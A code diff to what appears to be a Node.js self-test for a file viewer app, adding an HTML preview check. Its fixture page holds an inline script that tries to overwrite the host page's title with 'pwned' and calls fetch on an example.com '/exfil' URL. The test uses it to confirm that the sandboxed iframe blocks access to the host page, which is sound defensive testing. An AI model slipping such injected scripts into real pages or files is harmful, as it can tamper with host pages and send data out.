@@ -4,7 +4,7 @@ const assert = require('node:assert/strict');
 const { saveBindings } = require('./project-bindings.cjs');
 const {
   verifyNavigation,
-  verifyWheel,
+  verifyWheelScroll,
   transitionFullscreen,
 } = require('./navigation-selftest.cjs');
 let directory;
@@ -35,6 +35,14 @@ function prepare(config) {
         (_, i) => `Line ${i}: ${i === 321 ? 'UNIQUE_RESULT' : 'running'}`,
       ).join('\n'),
     'notes.txt': 'plain text\n中文\n',
+    'page.html':
+      '<!DOCTYPE html><html><head><style>body{font-family:sans-serif}</style></head><body>' +
+      '<h1>HTML preview marker</h1>' +
+      '<img src="https://example.com/remote-pixel.png">' +
+      '<script>parent.postMessage({htmlPreviewRan:true},"*");' +
+      'try{parent.document.title="pwned"}catch{}' +
+      'fetch("https://example.com/exfil").catch(()=>{});</script>' +
+      '</body></html>',
     'invalid.json': '{"value":broken}',
     'invalid.csv': 'a,b\n1,"unclosed',
     'invalid.jsonl': '{}\n{bad}\n',
@@ -129,7 +137,7 @@ async function run(window) {
       const measure = () =>
         evaluate(`document.querySelector('${selector}').getBoundingClientRect().height`);
       await verifyNavigation(window, measure);
-      await verifyWheel(window, measure, (delta, ctrl) =>
+      await verifyWheelScroll(window, measure, (delta, ctrl) =>
         evaluate(
           `(() => {const element=document.querySelector('.ia-file-view:not([hidden])')?.querySelector('.rp-document-viewport'); const event=new WheelEvent('wheel',{deltaY:${delta},ctrlKey:${ctrl},cancelable:true}); element.dispatchEvent(event); return event.defaultPrevented;})()`,
         ),
@@ -311,6 +319,27 @@ async function run(window) {
         `document.querySelector('.ia-file-view:not([hidden])')?.querySelector('.rp-document-text').textContent.includes('中文')`,
       ),
     );
+    await evaluate(
+      `window.__htmlProbe=false; window.addEventListener('message',event=>{if(event.data&&event.data.htmlPreviewRan)window.__htmlProbe=true})`,
+    );
+    await open('page.html', 'html');
+    assert.ok(
+      await evaluate(
+        `Boolean(document.querySelector('.ia-file-view:not([hidden])')?.querySelector('iframe.rp-document-html[sandbox="allow-scripts"]'))`,
+      ),
+    );
+    // Inline scripts run inside the sandboxed frame, but on an opaque origin:
+    // they can postMessage yet cannot touch the host page.
+    await wait(`window.__htmlProbe === true`);
+    assert.notEqual(await evaluate(`document.title`), 'pwned');
+    await click('Source');
+    await wait(
+      `document.querySelector('.ia-file-view:not([hidden])')?.querySelector('.rp-document-text')?.textContent.includes('<h1>HTML preview marker</h1>')`,
+    );
+    await click('Preview');
+    await wait(
+      `Boolean(document.querySelector('.ia-file-view:not([hidden])')?.querySelector('iframe.rp-document-html'))`,
+    );
     for (const [file, kind] of [
       ['invalid.csv', 'table'],
       ['invalid.json', 'json'],
@@ -382,8 +411,8 @@ async function run(window) {
     console.log(
       JSON.stringify({
         ok: true,
-        viewers: 5,
-        formats: 8,
+        viewers: 6,
+        formats: 9,
         navigation: true,
         fullscreenState: true,
         malformedSource: true,
